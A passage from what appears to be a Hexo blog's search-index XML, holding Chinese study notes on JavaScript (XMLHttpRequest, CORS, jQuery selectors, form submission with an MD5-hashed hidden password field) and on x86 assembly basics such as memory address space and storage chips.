class="string">&#x27;test-response-text&#x27;</span>);</span><br><span class="line">    textarea.value = text;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fail</span>(<span class="params">code</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> textarea = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;test-response-text&#x27;</span>);</span><br><span class="line">    textarea.value = <span class="string">&#x27;Error code: &#x27;</span> + code;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> request = <span class="keyword">new</span> XMLHttpRequest(); <span class="comment">// 新建XMLHttpRequest对象</span></span><br><span class="line"></span><br><span class="line">request.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="comment">// 状态发生变化时，函数被回调</span></span><br><span class="line">    <span class="keyword">if</span> (request.readyState === <span class="number">4</span>) &#123; <span class="comment">// 成功完成</span></span><br><span class="line">        <span class="comment">// 判断响应结果:</span></span><br><span class="line">        <span class="keyword">if</span> (request.status === <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="comment">// 成功，通过responseText拿到响应的文本:</span></span><br><span class="line">            <span class="keyword">return</span> success(request.responseText);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 失败，根据响应码判断失败原因:</span></span><br><span class="line">            <span class="keyword">return</span> fail(request.status);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// HTTP请求还在继续...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发送请求:</span></span><br><span class="line">request.open(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/api/categories&#x27;</span>);</span><br><span class="line">request.send();</span><br><span class="line"></span><br><span class="line">alert(<span class="string">&#x27;请求已发送，请等待响应...&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote><h1 id="CORS跨域"><a href="#CORS跨域" class="headerlink" title="CORS跨域"></a>CORS跨域</h1><p>CORS全称Cross-Origin Resource Sharing，是HTML5规范定义的如何跨域访问资源。</p><blockquote><p>假设本域是<code>my.com</code>，外域是<code>sina.com</code>，只要响应头<code>Access-Control-Allow-Origin</code>为<code>http://my.com</code>，或者是<code>*</code>，本次请求就可以成功。</p><p>可见，跨域能否成功，取决于对方服务器是否愿意给你设置一个正确的<code>Access-Control-Allow-Origin</code>，决定权始终在对方手中。</p></blockquote><h1 id="jQuery"><a href="#jQuery" class="headerlink" title="jQuery"></a>jQuery</h1><h3 id="符号"><a href="#符号" class="headerlink" title="$符号"></a>$符号</h3><p><code>$</code>是著名的jQuery符号。实际上，jQuery把所有功能全部封装在一个全局变量<code>jQuery</code>中，而<code>$</code>也是一个合法的变量名，它是变量<code>jQuery</code>的别名：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.jQuery; <span class="comment">// jQuery(selector, context)</span></span><br><span class="line"><span class="built_in">window</span>.$; <span class="comment">// jQuery(selector, context)</span></span><br><span class="line">$ === jQuery; <span class="comment">// true</span></span><br><span class="line"><span class="keyword">typeof</span>($); <span class="comment">// &#x27;function&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="利用jQuery查找节点"><a href="#利用jQuery查找节点" class="headerlink" title="利用jQuery查找节点"></a>利用jQuery查找节点</h3><ul><li><p>按ID查找</p>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查找&lt;div id=&quot;abc&quot;&gt;:</span></span><br><span class="line"><span class="keyword">var</span> div = $(<span class="string">&#x27;#abc&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p>按tag查找</p>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ps = $(<span class="string">&#x27;p&#x27;</span>); <span class="comment">// 返回所有&lt;p&gt;节点</span></span><br><span class="line">ps.length; <span class="comment">// 数一数页面有多少个&lt;p&gt;节点</span></span><br></pre></td></tr></table></figure></li><li><p>按class查找，按class查找注意在class名称前加一个<code>.</code></p>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = $(<span class="string">&#x27;.red&#x27;</span>); <span class="comment">// 所有节点包含`class=&quot;red&quot;`都将返回</span></span><br><span class="line"><span class="comment">// 例如:</span></span><br><span class="line"><span class="comment">// &lt;div class=&quot;red&quot;&gt;...&lt;/div&gt;</span></span><br><span class="line"><span class="comment">// &lt;p class=&quot;green red&quot;&gt;...&lt;/p&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>按属性查找</p>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> email = $(<span class="string">&#x27;[name=email]&#x27;</span>); <span class="comment">// 找出&lt;??? name=&quot;email&quot;&gt;</span></span><br><span class="line"><span class="keyword">var</span> passwordInput = $(<span class="string">&#x27;[type=password]&#x27;</span>); <span class="comment">// 找出&lt;??? type=&quot;password&quot;&gt;</span></span><br><span class="line"><span class="keyword">var</span> a = $(<span class="string">&#x27;[items=&quot;A B&quot;]&#x27;</span>); <span class="comment">// 找出&lt;??? items=&quot;A B&quot;&gt;</span></span><br><span class="line"><span class="keyword">var</span> icons = $(<span class="string">&#x27;[name^=icon]&#x27;</span>); <span class="comment">// 找出所有name属性值以icon开头的DOM</span></span><br><span class="line"><span class="comment">// 例如: name=&quot;icon-1&quot;, name=&quot;icon-2&quot;</span></span><br><span class="line"><span class="keyword">var</span> names = $(<span class="string">&#x27;[name$=with]&#x27;</span>); <span class="comment">// 找出所有name属性值以with结尾的DOM</span></span><br><span class="line"><span class="comment">// 例如: name=&quot;startswith&quot;, name=&quot;endswith&quot;</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><p>组合查找</p>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> emailInput = $(<span class="string">&#x27;input[name=email]&#x27;</span>); <span class="comment">// 不会找出&lt;div name=&quot;email&quot;&gt;</span></span><br></pre></td></tr></table></figure><p>  同样的，根据tag和class来组合查找也很常见：</p>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> tr = $(<span class="string">&#x27;tr.red&#x27;</span>); <span class="comment">// 找出&lt;tr class=&quot;red ...&quot;&gt;...&lt;/tr&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>多项选择器</p>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&#x27;p,div&#x27;</span>); <span class="comment">// 把&lt;p&gt;和&lt;div&gt;都选出来</span></span><br><span class="line">$(<span class="string">&#x27;p.red,p.green&#x27;</span>); <span class="comment">// 把&lt;p class=&quot;red&quot;&gt;和&lt;p class=&quot;green&quot;&gt;都选出来</span></span><br></pre></td></tr></table></figure></li></ul><p><em><u>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的地址是<a href="https://www.liaoxuefeng.com/">廖学峰的官方网站</a>。</u></em></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> JS学习笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> JavaScript </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>x86汇编学习笔记(0X02)</title>
+      <link href="2020/09/03/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_0x02/"/>
+      <url>2020/09/03/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_0x02/</url>
+      
+        <content type="html"><![CDATA[<h1 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h1><h2 id="内存地址空间（概述）"><a href="#内存地址空间（概述）" class="headerlink" title="内存地址空间（概述）"></a>内存地址空间（概述）</h2><blockquote><p>例：</p><p>一个CPU的地址总线宽度位10，那么他的寻址空间就是1024个内存单元，这1024个可以寻到的内存单元就构成了整个CPU的内存地址空间。</p></blockquote><h2 id="主板"><a href="#主板" class="headerlink" title="主板"></a>主板</h2><blockquote><p>每一台PC机中，都有一个主板，主板上有核心器件和一些主要器件、这些器件通过总线（地址总线、数据总线、控制总线）相连。这些器件有CPU、存储器、外围芯片组、扩展插槽等等，扩展插槽上一般有RAM内存条和各类接卡口。</p></blockquote><h2 id="接口卡"><a href="#接口卡" class="headerlink" title="接口卡"></a>接口卡</h2><blockquote><p>计算机中，所有设备必须受CPU控制。CPU通过总线向接卡口发送命令，接卡口根据CPU的命令控制外接设备工作。</p></blockquote><h2 id="各类存储器芯片"><a href="#各类存储器芯片" class="headerlink" title="各类存储器芯片"></a>各类存储器芯片</h2><blockquote><p>从读写属性上分为两类：</p><ul><li>随机存储器（RAM）—-可读可写，但必须带点存储，关机后存储的内容丢失。</li><li>只读存储器（ROM）—-只读，关机后内容不丢失。</li></ul><p>从功能和链接分为以下几类</p><ul><li><p>随机存储器</p><p>  <em>用于存放CPU使用的绝大部分数据，<strong>主随机存储器</strong>一般由主板和扩展插槽上的RAM存储器构成</em></p></li><li><p>装有BIOS的ROM</p><p>  <em>BIOS是又主板和各类接卡口厂商提供的软件系统，可以利用该硬件设备进行最基本的输入输出。在主板和某些接卡口上插有存储响应BIOS的ROM，例如：显卡的ROM存储着显卡的BIOS，网卡的ROM存储网卡的BIOS</em></p></li><li><p>接卡口上的RAM</p><p>  <em>某些接卡口需要对大量输入、输出数据进行暂存，其上就装有RAM</em></p></li></ul><p>下图展示了PC中各类存储器的逻辑连接情况</p><p><img src= "/img/loading.gif" data-lazy-src="https://github.com/whh6tl/img/blob/master/1.1.7.png?raw=true" alt="1.1.7.png"></p></blockquote><h2 id="内存地址空间"><a href="#内存地址空间" class="headerlink" title="内存地址空间"></a>内存地址空间</h2><blockquote><p>上述的存储器，在物理上是独立的器件，但是以下两点相同</p><ul><li>都和CPU相连</li><li>CPU对他们读写的时候通过<strong>控制线</strong>发送读写命令</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://github.com/whh6tl/img/blob/master/1.1.8.png?raw=true" alt="1.1.8.png"></p><p>CPU在操纵他们的时候，把它们当作内存来对待。把他们当作由一个或若干个由存储单元组成的逻辑存储器，这个<strong>逻辑存储器</strong>就是内存地址空间</p><p>内存地址空间大小受CPU总线宽度影响，比如8086CPU的总线宽度位20，那么就可以传送2的20次方个不同的地址信息。即可以定位2的20次方个内存单元，即8086PC的内存地址空间为1M.</p><p><strong>最终运行的程序时CPU，用汇编语言编程的时候，必须要从CPU的角度考虑问题。</strong></p><p><strong>对CPU来讲，系统中所有存储器中的存储单元都属于一个逻辑存储器中，它的容量受CPU的寻址能力限制。这个逻辑存储器就是我们所说的你存地址空间</strong></p></blockquote><p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《汇编语言（第3版）》王爽著；</em></strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> x86汇编 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> x86汇编 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>JS笔记(0X09)</title>
+      <link href="2020/09/02/JS_0X09/"/>
+      <url>2020/09/02/JS_0X09/</url>
+      
+        <content type="html"><![CDATA[<h1 id="操作表单"><a href="#操作表单" class="headerlink" title="操作表单"></a>操作表单</h1><blockquote><p>概念：表单本身也是DOM树，表单的输入框、下拉框等可以接收用户输入，所以用JavaScript来操作表单，可以获得用户输入的内容，或者对一个输入框设置新的内容。</p><p>HTML表单的输入控件主要有以下几种：</p><ul><li>文本框，对应的<code>&lt;input type=&quot;text&quot;&gt;</code>，用于输入文本；</li><li>口令框，对应的<code>&lt;input type=&quot;password&quot;&gt;</code>，用于输入口令；</li><li>单选框，对应的<code>&lt;input type=&quot;radio&quot;&gt;</code>，用于选择一项；</li><li>复选框，对应的<code>&lt;input type=&quot;checkbox&quot;&gt;</code>，用于选择多项；</li><li>下拉框，对应的<code>&lt;select&gt;</code>，用于选择一项；</li><li>隐藏文本，对应的<code>&lt;input type=&quot;hidden&quot;&gt;</code>，用户不可见，但表单提交时会把隐藏文本发送到服务器。</li></ul></blockquote><h2 id="获取值"><a href="#获取值" class="headerlink" title="获取值"></a>获取值</h2><p>如果获得了一个input节点，就可以直接调用value获得对应的用户输入的值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &lt;input type=&quot;text&quot; id=&quot;email&quot;&gt;</span></span><br><span class="line"><span class="keyword">var</span> input = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;email&#x27;</span>);</span><br><span class="line">input.value; <span class="comment">// &#x27;用户输入的值&#x27;</span></span><br></pre></td></tr></table></figure><p>这种方式可以应用于<code>text</code>、<code>password</code>、<code>hidden</code>以及<code>select</code>。但是，对于单选框和复选框，<code>value</code>属性返回的永远是HTML预设的值，而我们需要获得的实际是用户是否“勾上了”选项，所以应该用<code>checked</code>判断：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &lt;label&gt;&lt;input type=&quot;radio&quot; name=&quot;weekday&quot; id=&quot;monday&quot; value=&quot;1&quot;&gt; Monday&lt;/label&gt;</span></span><br><span class="line"><span class="comment">// &lt;label&gt;&lt;input type=&quot;radio&quot; name=&quot;weekday&quot; id=&quot;tuesday&quot; value=&quot;2&quot;&gt; Tuesday&lt;/label&gt;</span></span><br><span class="line"><span class="keyword">var</span> mon = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;monday&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> tue = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;tuesday&#x27;</span>);</span><br><span class="line">mon.value; <span class="comment">// &#x27;1&#x27;</span></span><br><span class="line">tue.value; <span class="comment">// &#x27;2&#x27;</span></span><br><span class="line">mon.checked; <span class="comment">// true或者false</span></span><br><span class="line">tue.checked; <span class="comment">// true或者false</span></span><br></pre></td></tr></table></figure><h2 id="设置值"><a href="#设置值" class="headerlink" title="设置值"></a>设置值</h2><p>设置值和获取值类似，对于<code>text</code>、<code>password</code>、<code>hidden</code>以及<code>select</code>，直接设置<code>value</code>就可以：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &lt;input type=&quot;text&quot; id=&quot;email&quot;&gt;</span></span><br><span class="line"><span class="keyword">var</span> input = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;email&#x27;</span>);</span><br><span class="line">input.value = <span class="string">&#x27;test@example.com&#x27;</span>; <span class="comment">// 文本框的内容已更新</span></span><br></pre></td></tr></table></figure><p>对于单选框和复选框，设置<code>checked</code>为<code>true</code>或<code>false</code>即可。</p><h2 id="提交表单"><a href="#提交表单" class="headerlink" title="提交表单"></a>提交表单</h2><p>方式一是通过<code>&lt;form&gt;</code>元素的<code>submit()</code>方法提交一个表单，例如，响应一个<code>&lt;button&gt;</code>的<code>click</code>事件，在JavaScript代码中提交表单：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- HTML --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;test-form&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;test&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;doSubmitForm()&quot;</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">doSubmitForm</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> form = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;test-form&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 可以在此修改form的input...</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 提交form:</span></span></span><br><span class="line">    form.submit();</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这种方式的缺点是扰乱了浏览器对form的正常提交。浏览器默认点击<code>&lt;button type=&quot;submit&quot;&gt;</code>时提交表单，或者用户在最后一个输入框按回车键。因此，第二种方式是响应<code>&lt;form&gt;</code>本身的<code>onsubmit</code>事件，在提交form时作修改：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- HTML --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;test-form&quot;</span> <span class="attr">onsubmit</span>=<span class="string">&quot;return checkForm()&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;test&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">checkForm</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> form = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;test-form&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 可以在此修改form的input...</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 继续下一步:</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="literal">true</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意要<code>return true</code>来告诉浏览器继续提交，如果<code>return false</code>，浏览器将不会继续提交form，这种情况通常对应用户输入有误，提示用户错误信息后终止提交form。</p><p>在检查和修改<code>&lt;input&gt;</code>时，要充分利用<code>&lt;input type=&quot;hidden&quot;&gt;</code>来传递数据。</p><p>例如，很多登录表单希望用户输入用户名和口令，但是，安全考虑，提交表单时不传输明文口令，而是口令的MD5。普通JavaScript开发人员会直接修改<code>&lt;input&gt;</code>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- HTML --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;login-form&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">onsubmit</span>=<span class="string">&quot;return checkForm()&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">checkForm</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> pwd = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;password&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 把用户输入的明文变为MD5:</span></span></span><br><span class="line">    pwd.value = toMD5(pwd.value);</span><br><span class="line"><span class="javascript">    <span class="comment">// 继续下一步:</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="literal">true</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这个做法看上去没啥问题，但用户输入了口令提交时，口令框的显示会突然从几个<code>*</code>变成32个<code>*</code>（因为MD5有32个字符）。</p><p>要想不改变用户的输入，可以利用<code>&lt;input type=&quot;hidden&quot;&gt;</code>实现：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- HTML --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;login-form&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">onsubmit</span>=<span class="string">&quot;return checkForm()&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;input-password&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">id</span>=<span class="string">&quot;md5-password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">checkForm</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> input_pwd = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;input-password&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> md5_pwd = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;md5-password&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 把用户输入的明文变为MD5:</span></span></span><br><span class="line">    md5_pwd.value = toMD5(input_pwd.value);</span><br><span class="line"><span class="javascript">    <span class="comment">// 继续下一步:</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="literal">true</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意到<code>id</code>为<code>md5-password</code>的<code>&lt;input&gt;</code>标记了<code>name=&quot;password&quot;</code>，而用户输入的<code>id</code>为<code>input-password</code>的<code>&lt;input&gt;</code>没有<code>name</code>属性。没有<code>name</code>属性的<code>&lt;input&gt;</code>的数据不会被提交。</p><p><em><u>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的地址是<a href="https://www.liaoxuefeng.com/">廖学峰的官方网站</a>。</u></em></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> JS学习笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> JavaScript </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>x86汇编学习笔记(0X01)</title>
+      <link href="2020/09/02/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_0x01/"/>
+      <url>2020/09/02/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_0x01/</url>
+      
+        <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="二进制-lt-–-gt-十进制"><a href="#二进制-lt-–-gt-十进制" class="headerlink" title="二进制&lt;–&gt;十进制"></a>二进制&lt;–&gt;十进制</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">01000100（二进制） -----------68（十进制）</span><br><span class="line">&#x2F;&#x2F;从1开始，1，2，4，8，17，34，68</span><br></pre></td></tr></table></figure><h2 id="汇编语言的组成"><a href="#汇编语言的组成" class="headerlink" title="汇编语言的组成"></a>汇编语言的组成</h2><ol><li>汇编指令：机器码的助记符，有对应的机器码。</li><li>伪指令：没有对应的机器码，由编译器执行，计算机并不执行。</li><li>其他符号：如<code>+、-、*、/</code> 等，由编译器识别，没有对应的机器码。</li></ol><h2 id="存储器"><a href="#存储器" class="headerlink" title="存储器"></a>存储器</h2><blockquote><p>指令和数据在存储器中存放，也就是平常说的内存。离开了内存，再好的cpu也无法工作</p></blockquote><h2 id="指令和数据"><a href="#指令和数据" class="headerlink" title="指令和数据"></a>指令和数据</h2><blockquote><p>指令和数据是应用上的概念，CPU在工作的时候，把有的信息看作指令，有的信息看作数据，为同样的信息赋予了不同意义</p><p>例：</p><ul><li>1000100111011000  –&gt;  86D8H （数据）</li><li>1000100111011000 –&gt;  mov ax,bx（程序）</li></ul></blockquote><h2 id="汇编命令"><a href="#汇编命令" class="headerlink" title="汇编命令"></a>汇编命令</h2><ul><li>操作：寄存器BX的内容送到AX中</li><li>机器指令：1000100111011000</li><li>汇编指令：mov ax,bx</li></ul><h2 id="存储单元"><a href="#存储单元" class="headerlink" title="存储单元"></a>存储单元</h2><blockquote><p>存储器被划分为若干存储单元，例如一个存储器由128个存储单元，一个存储单元可以存储8个bit，也就是一个Byte（字节），即8个二进制位，那么128个存储单元也就可以存储128个字节。</p></blockquote><h2 id="CPU对存储器的读写"><a href="#CPU对存储器的读写" class="headerlink" title="CPU对存储器的读写"></a>CPU对存储器的读写</h2><blockquote><p>CPU想要进行数据的读写，必须和外部器件（准确的说是芯片）进行下面3类信息交互</p><ul><li>存储单元的地址（地址信息）</li><li>器件的选择，读或写的命令（控制信息）</li><li>读或写的数据（数据信息）</li></ul><p>CPU通过总线将地址、数据、控制信息传到存储芯片中</p><p>总线又分为3类：地址总线、数据总线、控制总线</p></blockquote><h3 id="读写操作步骤："><a href="#读写操作步骤：" class="headerlink" 